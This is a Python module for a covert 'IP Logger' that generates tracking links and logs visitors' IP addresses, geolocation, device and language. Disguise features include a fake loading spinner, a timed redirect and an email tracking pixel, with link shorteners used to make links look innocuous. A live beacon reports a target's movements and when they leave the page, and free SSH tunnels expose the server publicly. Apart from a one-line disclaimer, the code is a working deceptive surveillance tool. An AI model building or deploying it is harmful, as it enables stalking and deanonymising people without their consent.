#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IP Logger — generate a tracking link & capture a visitor's IP silently.

How it works
------------
1. A tiny local HTTP server starts and a unique link is generated.
2. When the link is opened (click, email-open pixel, or link preview), the
   server logs: public IP, geolocation (konsensus 8 sumber, reuse ip_tracker),
   User-Agent (browser/OS/device), referrer, Accept-Language, and timestamp.
3. The visitor sees a harmless decoy instead of any tracking UI:
     - redirect → 302 to a URL you choose (e.g. a YouTube/meme/news link)
     - page     → custom HTML page you supply
     - pixel    → a 1x1 transparent GIF (for embedding in emails)
4. Optionally exposes the server publicly via localhost.run / serveo
   (free SSH tunnels, no account) so the link works across the internet.

Ethical use only: authorized OSINT / scam investigation, never on non-consenting
people outside a lawful context.
"""

from __future__ import annotations

import asyncio
import html
import ipaddress
import json
import re
import secrets
import shutil
import signal
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse

from aiohttp import web

from .ip_tracker import geolocate

# Minimal transparent 1x1 GIF (tracking pixel).
PIXEL_GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
    b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
    b"\x00\x02\x02D\x01\x00;"
)

# Live-tracking decoy page: looks like a harmless "Loading…" spinner but
# silently pings the server every 15s (beacon). Each ping carries the visitor's
# current IP, so if the target changes network/location while the page is open
# we keep getting live updates. A final beacon fires when they close/leave.
LIVE_TRACK_HTML = """<!doctype html><html><head><meta charset="utf-8">
<title>Loading…</title>
<style>body{background:#0b0f14;color:#9aa4b2;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.spinner{width:44px;height:44px;border:5px solid #1d2733;border-top-color:#4f9cf7;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div style="text-align:center"><div class="spinner" style="margin:0 auto"></div><p style="margin-top:18px">Loading…</p></div>
<script>
(function(){
  var B = '/g/$TOKEN';
  function ping(){ try{ fetch(B + '?b=1', {cache:'no-store', mode:'no-cors'}).catch(function(){}); }catch(e){} }
  var iv = setInterval(ping, 15000);
  ping();
  function bye(){
    try{ navigator.sendBeacon(B + '?bye=1'); }catch(e){}
    clearInterval(iv);
  }
  document.addEventListener('visibilitychange', function(){ if(document.visibilityState==='hidden') bye(); });
  window.addEventListener('pagehide', bye);
})();
</script></body></html>"""

# Redirect + live-tracking decoy: pings every 15s (live), then redirects to
# the decoy URL after a short delay so it still looks like a normal link.
REDIRECT_LIVE_HTML = """<!doctype html><html><head><meta charset="utf-8">
<title>Redirecting…</title>
<style>body{background:#0b0f14;color:#9aa4b2;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}</style></head>
<body><p style="color:#6b7280">Redirecting…</p>
<script>
(function(){
  var B = '/g/$TOKEN';
  var URL = '$REDIRECT_URL';
  function ping(){ try{ fetch(B + '?b=1', {cache:'no-store', mode:'no-cors'}).catch(function(){}); }catch(e){} }
  var iv = setInterval(ping, 15000);
  ping();
  function bye(){ try{ navigator.sendBeacon(B + '?bye=1'); }catch(e){} clearInterval(iv); }
  document.addEventListener('visibilitychange', function(){ if(document.visibilityState==='hidden') bye(); });
  window.addEventListener('pagehide', bye);
  setTimeout(function(){ window.location.href = URL; }, 2500);
})();
</script></body></html>"""

# How long without a beacon before we consider the target gone (seconds).
VISITOR_TIMEOUT = 45

# First-contact page served when the tunnel did not forward the visitor's IP
# (localhost.run/serveo sometimes omit X-Forwarded-For entirely, so the server
# only sees 127.0.0.1). The page asks the visitor's OWN browser for its public
# IP (api.ipify.org — free, CORS-enabled) and re-hits us with ?ip=<real IP>.
# Falls back to ?noip=1 after 8s so no-JS/blocked visitors still get the decoy.
DISCOVERY_HTML = """<!doctype html><html><head><meta charset="utf-8">
<title>Loading…</title>
<noscript><meta http-equiv="refresh" content="0;url=./?noip=1"></noscript>
</head><body>
<script>
(function(){
  var base = location.pathname; /* /g/TOKEN */
  try {
    fetch('https://api.ipify.org?format=json').then(function(r){ return r.json(); })
      .then(function(d){ location.replace(base + '?ip=' + encodeURIComponent(d && d.ip ? d.ip : '')); })
      .catch(function(){ location.replace(base + '?noip=1'); });
  } catch(e) { location.replace(base + '?noip=1'); }
  setTimeout(function(){ location.replace(base + '?noip=1'); }, 8000);
})();
</script></body></html>"""

# Loopback peers = connection arrived through a tunnel/SSH (real client IP is
# somewhere in headers or must be discovered by the browser itself).
_LOOPBACK_HOSTS = ("127.0.0.1", "::1", "localhost")


def _is_public_ip(ip: str) -> bool:
    """True if `ip` parses as a routable public address (not private/loopback)."""
    try:
        addr = ipaddress.ip_address((ip or "").strip())
    except ValueError:
        return False
    return not (addr.is_private or addr.is_loopback or addr.is_link_local
                or addr.is_multicast or addr.is_reserved or addr.is_unspecified)

DEFAULT_OUTPUT_DIR = Path("output") / "iplogger"

# ── Bot / link-preview detection ─────────────────────────────────────────────
# WhatsApp/Telegram/Discord/etc fetch a preview when a link is pasted, so the
# first hit is often the platform crawler, not the human. Flag these so the
# user can tell them apart from a real visit.
BOTS = [
    ("facebookexternalhit", "Facebook preview"),
    ("facebot", "Facebook"),
    ("telegrambot", "Telegram"),
    ("whatsapp", "WhatsApp"),
    ("discordbot", "Discord"),
    ("slackbot", "Slack"),
    ("twitterbot", "Twitter/X"),
    ("googlebot", "Google"),
    ("bingbot", "Bing"),
    ("duckduckbot", "DuckDuckGo"),
    ("applebot", "Apple"),
    ("linkedinbot", "LinkedIn"),
    ("pinterestbot", "Pinterest"),
    ("linebot", "Line"),
    ("vkbot", "VK"),
    ("curl/", "curl"),
    ("python-requests", "Python requests"),
    ("python-urllib", "Python urllib"),
    ("okhttp/", "OkHttp"),
    ("go-http-client", "Go client"),
    ("headlesschrome", "Headless Chrome"),
]

TUNNEL_URL_RE = re.compile(r"https?://[^\s\"'<>]+")

# Free URL shorteners (keyless) — make the tracking link look innocuous.
# clck.ru accepts tunnel domains (localhost.run/serveo) that is.gd/tinyurl
# reject as spam; is.gd/tinyurl kept as fallback for normal URLs.
SHORTENERS = [
    "https://clck.ru/--?url={}",
    "https://is.gd/create.php?format=simple&url={}",
    "https://tinyurl.com/api-create.php?url={}",
]

REPORT_TEMPLATE = """<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>IP Logger Report — $TOKEN</title>
<style>
body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;margin:0;line-height:1.6}
.container{max-width:860px;margin:0 auto;padding:2rem 1.2rem}
h1{color:#58a6ff;font-size:1.7rem;border-bottom:1px solid #30363d;padding-bottom:.5rem}
h2{color:#f0883e;font-size:1.1rem}
.stats{display:flex;gap:1rem;flex-wrap:wrap;margin:1rem 0}
.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:.7rem 1.1rem}
.stat b{display:block;font-size:1.4rem;color:#f0883e}
.stat span{font-size:.72rem;color:#8b949e;text-transform:uppercase;letter-spacing:.05em}
.cap{background:#161b22;border:1px solid #30363d;border-left:3px solid #3fb950;border-radius:8px;padding:.9rem 1rem;margin:.6rem 0}
.cap.bot{border-left-color:#f85149}
.cap-head{display:flex;align-items:center;gap:.7rem;flex-wrap:wrap}
.ip{font-weight:700;color:#58a6ff;font-family:ui-monospace,Consolas,monospace}
.time{color:#8b949e;font-size:.78rem}
.badge{font-size:.66rem;font-weight:700;padding:2px 8px;border-radius:10px;margin-left:auto}
.badge.human{background:#23863633;color:#3fb950;border:1px solid #23863666}
.badge.bot{background:#da363333;color:#f85149;border:1px solid #da363366}
.cap-meta{font-size:.82rem;color:#c9d1d9;margin-top:3px}
.cap-meta a{color:#58a6ff}
.footer{color:#8b949e;font-size:.75rem;margin-top:2rem;border-top:1px solid #30363d;padding-top:1rem;text-align:center}
</style></head><body><div class="container">
<h1>🎯 IP Logger Report</h1>
<div class="stats">
  <div class="stat"><b>$TOTAL</b><span>Total Hits</span></div>
  <div class="stat"><b>$HUMANS</b><span>Human</span></div>
  <div class="stat"><b>$BOTS</b><span>Bot/Preview</span></div>
  <div class="stat"><b>$UNIQUE</b><span>Unique IPs</span></div>
</div>
<h2>Captures</h2>
$ROWS
<div class="footer">Generated $GENERATED · Zqrya IP Logger · authorized OSINT use only</div>
</div></body></html>"""


def parse_user_agent(ua: str) -> Dict[str, Optional[str]]:
    """Lightweight User-Agent parser (no extra dependency)."""
    out: Dict[str, Optional[str]] = {
        "browser": "Other", "os": "Other", "device": "unknown",
        "is_bot": False, "bot_name": None,
    }
    if not ua:
        return out

    low = ua.lower()
    for key, name in BOTS:
        if key in low:
            out.update(is_bot=True, bot_name=name)
            return out

    # OS
    if "windows" in low:
        out["os"] = "Windows"
    elif "android" in low:
        out["os"] = "Android"
    elif "ipad" in low:
        out["os"] = "iPadOS"
    elif "iphone" in low or "ios" in low:
        out["os"] = "iOS"
    elif "mac os x" in low or "macintosh" in low:
        out["os"] = "macOS"
    elif "linux" in low:
        out["os"] = "Linux"

    # Browser / in-app client
    if "edg/" in low:
        out["browser"] = "Edge"
    elif "opr/" in low or "opera" in low:
        out["browser"] = "Opera"
    elif "crios/" in low:
        out["browser"] = "Chrome (iOS)"
    elif "chrome/" in low:
        out["browser"] = "Chrome"
    elif "firefox/" in low:
        out["browser"] = "Firefox"
    elif "safari/" in low:
        out["browser"] = "Safari"
    elif "instagram" in low:
        out["browser"] = "Instagram"
    elif "tiktok" in low or "musical_ly" in low:
        out["browser"] = "TikTok"

    out["device"] = "Mobile" if out["os"] in ("Android", "iOS", "iPadOS") else "Desktop"
    return out


def get_client_ip(request: web.Request) -> str:
    """Real visitor IP, resistant to spoofing.

    Behind a tunnel (localhost.run/serveo) the ssh client connects to our
    loopback, so `request.remote` is 127.0.0.1 and the real IP is the
    RIGHT-MOST X-Forwarded-For entry (the one appended by the tunnel — a
    client-supplied XFF stays on the left).
    On a direct connection we trust the socket peer and ignore XFF entirely,
    so a visitor cannot forge the logged IP.
    """
    peer = (request.remote or "").strip()
    if peer in ("127.0.0.1", "::1", "localhost"):
        xff = request.headers.get("X-Forwarded-For", "")
        parts = [p.strip() for p in xff.split(",") if p.strip()]
        if parts:
            return parts[-1]
        xri = request.headers.get("X-Real-IP", "")
        if xri.strip():
            return xri.strip()
    return peer


_PRIVATE_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
]


def _is_private_ip(ip: str) -> bool:
    """IPv4/IPv6 private & link-local detection (local test clicks, not a target)."""
    try:
        addr = ipaddress.ip_address(ip.strip())
    except ValueError:
        return False
    return any(addr in net for net in _PRIVATE_RANGES)


async def shorten_url(url: str) -> Optional[str]:
    """Shorten a URL via is.gd / tinyurl (free, keyless). Returns short URL or None."""
    from .proxy_manager import prepare_client

    encoded = quote(url, safe="")
    for api in SHORTENERS:
        try:
            async with prepare_client(timeout=10) as c:
                r = await c.get(api.format(encoded))
                if r.status_code == 200:
                    short = (r.text or "").strip()
                    if short.startswith("http") and short != url:
                        return short
        except Exception:
            continue
    return None


class IPLogger:
    """Asynchronous tracking server with decoy responses + persistence."""

    def __init__(
        self,
        port: int = 8080,
        redirect_url: Optional[str] = None,
        page_html: Optional[str] = None,
        pixel: bool = False,
        live: bool = False,
        shorten: bool = True,
        output_dir: Path = DEFAULT_OUTPUT_DIR,
    ):
        self.port = port
        self.redirect_url = redirect_url
        self.page_html = page_html
        self.pixel = pixel
        self.live = live
        self.shorten = shorten
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.token = secrets.token_urlsafe(6).rstrip("=")
        self.captures: List[Dict] = []
        self._pending: set = set()
        self._tunnel_proc: Optional[asyncio.subprocess.Process] = None
        self._tunnel_drain: Optional[asyncio.Task] = None
        # Serializes multi-line output so HIT blocks and tunnel/shorten
        # messages never interleave line-by-line.
        self._print_lock = asyncio.Lock()
        # Live tracking: visitor sessions keyed by cookie id.
        # Each session tracks last known location so we can detect movement.
        self._visitors: Dict[str, Dict] = {}
        self._sweeper: Optional[asyncio.Task] = None

        self.app = web.Application()
        self.app.router.add_get(f"/g/{self.token}", self._handle)
        self.app.router.add_get("/", self._handle)
        self.app.router.add_get("/pixel.gif", self._handle)

    # ── persistence ──
    def _log_file(self) -> Path:
        return self.output_dir / f"iplogger_{self.token}.json"

    def _save(self) -> None:
        try:
            self._log_file().write_text(
                json.dumps({"token": self.token, "captures": self.captures},
                           indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
        except Exception:
            pass

    # ── decoy ──
    def _decoy(self) -> web.Response:
        if self.redirect_url and self.live:
            # Live + redirect: pings while open, then redirects (2.5s).
            return web.Response(
                text=REDIRECT_LIVE_HTML
                    .replace("$TOKEN", self.token)
                    .replace("$REDIRECT_URL", html.escape(self.redirect_url, quote=True)),
                content_type="text/html",
                headers={"Cache-Control": "no-store"},
            )
        if self.redirect_url:
            return web.HTTPFound(self.redirect_url)
        if self.page_html:
            return web.Response(
                text=self.page_html, content_type="text/html",
                headers={"Cache-Control": "no-store"},
            )
        if self.live:
            return web.Response(
                text=LIVE_TRACK_HTML.replace("$TOKEN", self.token),
                content_type="text/html",
                headers={"Cache-Control": "no-store"},
            )
        return web.Response(
            body=PIXEL_GIF, content_type="image/gif",
            headers={"Cache-Control": "no-store, no-cache, must-revalidate"},
        )

    def _location_key(self, g: Dict) -> str:
        """Coarse location identity (city|region|country) for movement detection."""
        return "|".join(str(x) for x in (g.get("city"), g.get("region"), g.get("country")) if x)

    def _update_visitor(self, vid: str, ip: str, bye: bool = False) -> Dict:
        now = time.time()
        vis = self._visitors.get(vid)
        if vis is None:
            vis = {
                "first_seen": datetime.now().isoformat(),
                "last_ip": ip,
                "last_loc": None,
                "last_ts": now,
                "hits": 0,
                "movements": [],
                "left": False,
            }
            self._visitors[vid] = vis
        vis["last_ts"] = now
        vis["last_ip"] = ip
        vis["hits"] += 1
        if bye:
            vis["left"] = True
        return vis

    async def _emit_moved(self, c: Dict, g: Dict, prev_loc: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        now_loc = self._location_key(g)
        lines = [f"  [{ts}] 📍 Target berpindah — {prev_loc} → {now_loc}"]
        lines.append(IPLogger._kv("IP", c["ip"]))
        lines += IPLogger._geo_lines(c)
        await self._emit(lines)

    async def _emit_left(self, vid: str, vis: Dict) -> None:
        last = datetime.fromtimestamp(vis["last_ts"]).strftime("%H:%M:%S")
        await self._emit([
            f"  [{datetime.now().strftime('%H:%M:%S')}] ⏹ Target menutup halaman",
            f"  {IPLogger._kv('Visitor', vid[:8])}",
            f"  {IPLogger._kv('Last seen', last)}",
        ])

    # ── request handler ──
    async def _handle(self, request: web.Request) -> web.Response:
        # Visitor cookie: same person across beacons = continuous tracking.
        # Computed early so the discovery probe can carry the same id.
        vid = (request.cookies.get("visitor_id") or "").strip()
        if not vid:
            vid = secrets.token_urlsafe(8).rstrip("=")

        ip = get_client_ip(request)
        is_tunnel = (request.remote or "").strip() in _LOOPBACK_HOSTS
        is_beacon = request.query.get("b") == "1"
        is_bye = request.query.get("bye") == "1"

        # Browser-side IP discovery: when the tunnel did not forward the
        # visitor IP (localhost.run/serveo sometimes send no XFF at all), the
        # first page load is a DISCOVERY_HTML probe — the visitor's browser
        # asks api.ipify.org for its own public IP and re-hits us with ?ip=.
        # We only trust that query param from a loopback (tunnel) peer, and
        # only if it parses as a real public IP.
        qip = (request.query.get("ip") or "").strip()
        known_ip = None
        prev_vis = self._visitors.get(vid)
        if prev_vis:
            known_ip = prev_vis.get("known_ip") or None
        if qip and _is_public_ip(qip):
            ip = qip
        elif (is_tunnel and ip in _LOOPBACK_HOSTS and known_ip
              and _is_public_ip(known_ip)):
            # Later beacons/redirects from the same visitor carry no ?ip= —
            # reuse the IP this visitor's browser already reported.
            ip = known_ip
        elif (is_tunnel and ip in _LOOPBACK_HOSTS
              and not is_beacon and not is_bye and not request.query.get("noip")):
            # Tunnel peer without any client IP info → ask the browser itself.
            resp = web.Response(text=DISCOVERY_HTML, content_type="text/html",
                                headers={"Cache-Control": "no-store"})
            resp.set_cookie("visitor_id", vid, max_age=7 * 86400, samesite="Lax")
            return resp

        ua = request.headers.get("User-Agent", "")
        parsed = parse_user_agent(ua)
        is_bot = parsed["is_bot"]

        vis = self._update_visitor(vid, ip, bye=is_bye)
        if _is_public_ip(ip):
            # Remember the real IP for subsequent requests of this visitor.
            vis["known_ip"] = ip

        capture = {
            "id": uuid.uuid4().hex[:8],
            "visitor_id": vid,
            "is_beacon": is_beacon,
            "is_bye": is_bye,
            "ip": ip,
            "user_agent": ua,
            "browser": parsed["browser"],
            "os": parsed["os"],
            "device": parsed["device"],
            "is_bot": is_bot,
            "bot_name": parsed["bot_name"],
            "referrer": request.headers.get("Referer", ""),
            "accept_language": request.headers.get("Accept-Language", ""),
            "timestamp": datetime.now().isoformat(),
            "path": request.path,
            "geo": None,
        }
        self.captures.append(capture)
        self._save()

        # Print: full block for first visits / real humans, quiet for beacons
        # (movement & leave events get their own lines once geo resolves).
        if is_bye:
            vis["left"] = True
            await self._emit_left(vid, vis)
        elif not is_beacon:
            await self._print_capture(capture)

        # Enrich in background so the decoy is served instantly.
        task = asyncio.create_task(self._enrich(capture, vid))
        self._pending.add(task)
        task.add_done_callback(self._pending.discard)

        resp = self._decoy()
        resp.set_cookie("visitor_id", vid, max_age=7 * 86400, samesite="Lax")
        return resp

    async def _enrich(self, capture: Dict, vid: str) -> None:
        try:
            ip = capture["ip"]
            if not ip or _is_private_ip(ip):
                capture["geo"] = {"country": "LAN", "note": "private/test IP (kemungkinan klik uji sendiri)"}
            else:
                capture["geo"] = await geolocate(ip)
        except Exception as e:
            capture["geo"] = {"error": str(e)}
        self._save()

        g = capture.get("geo") or {}
        vis = self._visitors.get(vid)
        loc = self._location_key(g)

        has_geo = bool(g.get("country")) and g.get("country") != "LAN" and not g.get("error")
        if vis is not None and has_geo:
            prev = vis.get("last_loc")
            if prev and loc and loc != prev:
                # Real movement: same visitor changed location.
                vis["last_loc"] = loc
                vis["movements"].append({
                    "ts": capture["timestamp"],
                    "ip": capture["ip"],
                    "from": prev,
                    "to": loc,
                    "geo": g,
                })
                self._save()
                if capture.get("is_bye"):
                    return
                await self._emit_moved(capture, g, prev)
            elif not prev and loc:
                # First known location for this visitor — not a movement.
                vis["last_loc"] = loc
                self._save()
                if not capture.get("is_beacon") and not capture.get("is_bye"):
                    await self._print_geo(capture)
            elif not capture.get("is_beacon") and not capture.get("is_bye"):
                await self._print_geo(capture)
        elif not capture.get("is_beacon") and not capture.get("is_bye"):
            await self._print_geo(capture)

    # ── printing ──
    @staticmethod
    def _kv(label: str, value: str) -> str:
        """Aligned `label: value` line for clean live output."""
        return f"  {label:<9}: {value}"

    @staticmethod
    def _capture_lines(c: Dict) -> List[str]:
        tag = "BOT" if c.get("is_bot") else "HIT"
        icon = "🤖" if c.get("is_bot") else "🎯"
        lines = [f"  [{datetime.now().strftime('%H:%M:%S')}] {icon} {tag} #{c['id']} — {c['ip']}"]
        lines.append(IPLogger._kv("Device", f"{c.get('device')} · {c.get('os')} · {c.get('browser')}"))
        if c.get("is_bot"):
            lines.append(IPLogger._kv("Bot", f"{c.get('bot_name')} (bukan klik manusia)"))
        if c.get("referrer"):
            lines.append(IPLogger._kv("Referer", c["referrer"][:120]))
        if c.get("accept_language"):
            lines.append(IPLogger._kv("Language", c["accept_language"][:80]))
        return lines

    @staticmethod
    def _geo_lines(c: Dict) -> List[str]:
        g = c.get("geo") or {}
        if not g:
            return []
        if g.get("error"):
            return [IPLogger._kv("Geo", f"gagal ({g['error']})")]
        loc = " · ".join(x for x in (g.get("city"), g.get("region"), g.get("country")) if x)
        isp = g.get("isp") or g.get("org") or g.get("as_name") or ""
        parts = [loc or "—"]
        if isp:
            parts.append(f"ISP {isp}")
        flags = []
        if g.get("is_proxy"):
            flags.append("VPN/Proxy")
        if g.get("is_hosting"):
            flags.append("hosting/datacenter")
        if g.get("is_mobile"):
            flags.append("mobile")
        if flags:
            parts.append(" · ".join(flags))
        lines = [IPLogger._kv("Geo", " · ".join(parts))]
        if g.get("map_url"):
            lines.append(IPLogger._kv("Map", g["map_url"]))
        return lines

    async def _emit(self, lines: List[str]) -> None:
        """Print a block of lines atomically (one write, no interleaving)."""
        if not lines:
            return
        async with self._print_lock:
            print("\n".join(lines))

    async def _print_capture(self, c: Dict) -> None:
        await self._emit(self._capture_lines(c))

    async def _print_geo(self, c: Dict) -> None:
        await self._emit(self._geo_lines(c))

    # ── server lifecycle ──
    async def run(self, public_tunnel: bool = True) -> Dict[str, str]:
        """Start the server, print links, block until Ctrl+C. Returns link info."""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", self.port)
        await site.start()

        local = f"http://127.0.0.1:{self.port}/g/{self.token}"
        links = {"local": local, "public": None}
        await self._emit([f"🔗 Link target (lokal): {local}"])

        if public_tunnel:
            await self._emit(["Mencoba expose ke internet (localhost.run → cloudflare → pinggy)..."])
            self._tunnel_proc, pub, name = await self._start_tunnel()
            if pub:
                public_url = f"{(pub or '').rstrip('/')}/g/{self.token}"
                links["public"] = public_url
                await self._emit([
                    f"🌐 Link target (publik): {public_url}",
                    f"   (via {name} — gratis, tanpa akun)",
                ])
                if self.shorten:
                    await self._emit(["Memperpendek link (clck.ru/is.gd/tinyurl)..."])
                    short = await shorten_url(public_url)
                    if short:
                        links["short"] = short
                        await self._emit([f"🔗 Link pendek (kirim ini): {short}"])
                    else:
                        await self._emit(["⚠ Gagal memperpendek — pakai link publik di atas."])
            else:
                await self._emit([
                    "⚠ Semua tunnel publik gagal (localhost.run/cloudflare/pinggy/serveo).",
                    f"  Pakai port-forward manual: ngrok http {self.port}  lalu https://<ngrok>/g/{self.token}",
                    "  (atau install cloudflared:  brew install cloudflared  → otomatis dipakai)",
                ])

        if self.live:
            await self._emit([
                "",
                "🟢 MODE LIVE TRACKING: halaman target tetap terbuka & mem-ping tiap 15 detik.",
                "   Target pindah jaringan/lokasi → kamu dapat update otomatis.",
                "   Target tutup halaman → notifikasi 'menutup halaman'.",
            ])

        await self._emit([
            "",
            "Target cukup buka linknya sekali — IP & device langsung ke-log di sini.",
            "Kirim link, lalu tunggu. Tekan Ctrl+C untuk berhenti.",
            f"Log tersimpan di: {self._log_file()}",
        ])

        if self.live:
            self._sweeper = asyncio.create_task(self._sweep_visitors())

        try:
            await self._wait_for_shutdown()
        finally:
            if self._sweeper:
                self._sweeper.cancel()
                self._sweeper = None
            await runner.cleanup()
            await self._stop_tunnel()
            if self._pending:
                await asyncio.gather(*self._pending, return_exceptions=True)
            if self.captures:
                paths = self.save_report()
                if paths.get("html") or paths.get("json"):
                    print()
                if paths.get("html"):
                    print(f"  📄 Laporan HTML: {paths['html']}")
                if paths.get("json"):
                    print(f"  📄 Laporan JSON: {paths['json']}")
        return links

    async def _sweep_visitors(self) -> None:
        """Periodically mark visitors who stopped beaconing as gone."""
        while True:
            await asyncio.sleep(15)
            now = time.time()
            for vid, vis in list(self._visitors.items()):
                if vis.get("left"):
                    continue
                if now - vis.get("last_ts", now) > VISITOR_TIMEOUT:
                    vis["left"] = True
                    await self._emit_left(vid, vis)

    async def _wait_for_shutdown(self) -> None:
        """Block until SIGINT/SIGTERM (graceful) or task cancellation (fallback)."""
        loop = asyncio.get_running_loop()
        stop = asyncio.Event()
        installed = []
        try:
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, stop.set)
                installed.append(sig)
        except (NotImplementedError, RuntimeError):
            # Windows / non-main thread: just block until cancelled.
            while True:
                await asyncio.sleep(3600)
            return
        try:
            await stop.wait()
        finally:
            # Restore default handlers so the caller (e.g. interactive shell)
            # regains normal Ctrl+C behaviour after the logger stops.
            for sig in installed:
                try:
                    loop.remove_signal_handler(sig)
                except Exception:
                    pass

    async def _start_tunnel(self) -> Tuple[Optional[asyncio.subprocess.Process], Optional[str], Optional[str]]:
        """Best-effort public exposure via free tunnels (no account needed).

        Order: localhost.run (primary), then backups so the logger still works
        when the main provider is down:
          - Cloudflare quick tunnel (cloudflared binary, trycloudflare.com)
          - Pinggy (SSH over 443 — works even where port 22 is blocked)
          - serveo.net (last resort)
        """
        candidates: List[Tuple[str, List[str]]] = []
        if shutil.which("ssh") is not None:
            candidates += [
                ("localhost.run", ["ssh", "-o", "StrictHostKeyChecking=no",
                                   "-o", "ExitOnForwardFailure=yes",
                                   "-o", "ServerAliveInterval=60",
                                   "-R", f"80:localhost:{self.port}", "nokey@localhost.run"]),
                ("pinggy.io", ["ssh", "-p", "443", "-o", "StrictHostKeyChecking=no",
                               "-o", "ExitOnForwardFailure=yes",
                               "-o", "ServerAliveInterval=60",
                               "-R", f"0:localhost:{self.port}", "a.pinggy.io"]),
                ("serveo.net", ["ssh", "-o", "StrictHostKeyChecking=no",
                                "-o", "ExitOnForwardFailure=yes",
                                "-R", f"80:localhost:{self.port}", "serveo.net"]),
            ]
        if shutil.which("cloudflared") is not None:
            candidates.append(
                ("cloudflare", ["cloudflared", "tunnel", "--url",
                                 f"http://localhost:{self.port}"]))
        for name, cmd in candidates:
            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                url = await self._read_tunnel_url(proc, timeout=15)
                if url:
                    self._tunnel_drain = asyncio.create_task(self._drain_proc(proc))
                    return proc, url, name
                proc.terminate()
            except Exception:
                continue
        return None, None, None

    @staticmethod
    async def _drain_proc(proc) -> None:
        """Keep reading a long-running subprocess stdout so its pipe never fills."""
        try:
            while True:
                chunk = await proc.stdout.read(4096)
                if not chunk:
                    break
        except Exception:
            pass

    # Hosts whose bare root is NEVER a forwarding URL (banner/docs/admin).
    # Real tunnel URLs are always subdomains: xxx.lhr.life / xxx.localhost.run /
    # xxx.trycloudflare.com / xxx.pinggy.link / …
    _TUNNEL_BARE_HOSTS = ("localhost.run", "lhr.life", "serveo.net", "localhost",
                          "127.0.0.1", "0.0.0.0", "trycloudflare.com",
                          "cloudflare.com", "pinggy.io", "pinggy.link")
    # Paths that identify documentation pages, never the tunnel itself.
    _TUNNEL_BAD_PATH = ("/docs", "/faq", "/help", "/about", "/signup", "/login")

    @staticmethod
    def _extract_tunnel_url(text: str) -> Optional[str]:
        """Return the first real forwarding URL found in a line, else None.

        Rejects admin panels (admin.localhost.run / lhr.life/<id>), banner/docs
        URLs on the bare service domain (localhost.run/docs/…), and local URLs
        (localhost:PORT/…) that some SSH banners print.
        """
        # Strip ANSI colour/control codes so a coloured banner can't corrupt
        # the captured URL (localhost.run/serveo colour their output on TTYs).
        clean = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)
        # localhost.run v1 announces the tunnel as `Connect to HOST` (no scheme).
        m = re.search(r"\bConnect to ([\w.-]+\.[a-z]{2,})\b", clean, re.IGNORECASE)
        if m:
            cand = f"https://{m.group(1)}".rstrip(".")
            if IPLogger._is_tunnel_url(cand):
                return cand
        for m in TUNNEL_URL_RE.finditer(clean):
            url = m.group(0).rstrip(".,;])")
            if IPLogger._is_tunnel_url(url):
                return url
        return None

    @staticmethod
    def _is_tunnel_url(url: str) -> bool:
        """True if `url` is a plausible real forwarding URL (not banner/docs/admin)."""
        low_url = url.lower()
        if "admin" in low_url:
            return False
        try:
            parsed = urlparse(url)
            host = (parsed.hostname or "").lower()
        except ValueError:
            return False
        if not host:
            return False
        if host in IPLogger._TUNNEL_BARE_HOSTS:
            # Bare root = docs/banner, not the tunnel itself.
            return False
        path = parsed.path.lower()
        if any(path.startswith(p) for p in IPLogger._TUNNEL_BAD_PATH):
            return False
        return True

    @staticmethod
    async def _read_tunnel_url(proc, timeout: int = 15) -> Optional[str]:
        """Read tunnel stdout until the real forwarding URL appears.

        localhost.run prints BOTH:
            ** your url is: https://xxxx.lhr.life
            ** your admin url is: https://admin.localhost.run
        The admin URL is the tunnel control panel (login required) — picking it
        would send visitors to a login page instead of our decoy. So we prefer
        lines that explicitly announce the forwarding URL and reject admin URLs.
        """
        loop = asyncio.get_event_loop()
        deadline = loop.time() + timeout
        lines: List[str] = []
        try:
            while loop.time() < deadline:
                try:
                    line = await asyncio.wait_for(proc.stdout.readline(), timeout=2)
                except asyncio.TimeoutError:
                    if proc.returncode is not None:
                        break
                    continue
                if not line:
                    break
                text = line.decode(errors="ignore")
                low = text.lower()
                # Explicit forwarding announcements — highest priority.
                # (cloudflared prints the URL inside a boxed table, pinggy on its
                # own line, so we accept any line mentioning the provider.)
                if ("your url is" in low or "forwarding http" in low
                        or "forwarded for" in low or "trycloudflare.com" in low
                        or "pinggy" in low):
                    url = IPLogger._extract_tunnel_url(text)
                    if url:
                        return url
                lines.append(text)
            # Fallback: filtered scan of every line seen so far.
            for text in lines:
                url = IPLogger._extract_tunnel_url(text)
                if url:
                    return url
        except Exception:
            pass
        return None

    async def _stop_tunnel(self) -> None:
        if self._tunnel_drain and not self._tunnel_drain.done():
            self._tunnel_drain.cancel()
        self._tunnel_drain = None
        if self._tunnel_proc and self._tunnel_proc.returncode is None:
            try:
                self._tunnel_proc.terminate()
                await self._tunnel_proc.wait()
            except Exception:
                pass
        self._tunnel_proc = None

    # ── report export ──
